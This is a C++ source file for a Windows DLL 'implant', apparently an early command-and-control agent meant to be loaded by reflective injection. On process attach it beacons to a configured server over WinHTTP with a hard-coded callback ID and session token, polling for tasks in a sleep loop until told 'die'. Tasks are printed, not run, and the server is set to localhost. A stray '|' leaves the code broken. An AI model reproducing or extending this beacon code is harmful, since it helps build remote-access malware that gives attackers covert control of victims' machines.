#include "main.hpp"
#pragma comment(lib,"winhttp.lib")

bool recieve_commands(const implant_context& ctx) {


    HINTERNET hSession = nullptr;
    HINTERNET hConnect = nullptr;
    std::string file_buff;

    auto _ = defer([&]() {
       if(hSession != nullptr) {
           WinHttpCloseHandle(hSession);
       }
        if(hConnect != nullptr) {
            WinHttpCloseHandle(hConnect);
        }
    });
    if(!open_session(hSession, std::wstring(ctx.user_agent.begin(), ctx.user_agent.end()) )) {
        return false;
    }

    if(!open_connection(std::wstring(ctx.server_addr.begin(), ctx.server_addr.end()), ctx.port, hSession, hConnect)) {
        return false;
    }

    while(true) {
        Sleep(ctx.sleep_time);
        std::string server_task;

        if(!send_object_message(
            hConnect,
            ctx.callback_object,
            "get_task",
            ctx.session_token,
            ctx.is_https,
            server_task
        )) {
            continue;
        }

        if(server_task == "die") {
            break;
        }

        std::cout << "recieved task: " << server_task << std::endl;
    }
|
    return true;
}


BOOL APIENTRY DllMain(
    HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
) {

    std::cout << "Made it past reflective setup." << std::endl;

    implant_context ctx;
    ctx.callback_object = "fb5fde19-7052-4191-652b-83bd9f0a707f";
    ctx.session_token = "Ym52T0szcDZMaWVFNFZjeEx3WFdCMTNwWA==";
    ctx.server_addr = "127.0.0.1";
    ctx.port = 8081;
    ctx.is_https = false;
    ctx.user_agent = "test program/1.0";
    ctx.sleep_time = 3000;

    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
            std::cout << "we are so attached. starting..." << std::endl;
            if(!recieve_commands(ctx)) {
                std::cout << "FAILED!" << std::endl;
                return FALSE;
            }
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }

    return TRUE;
}
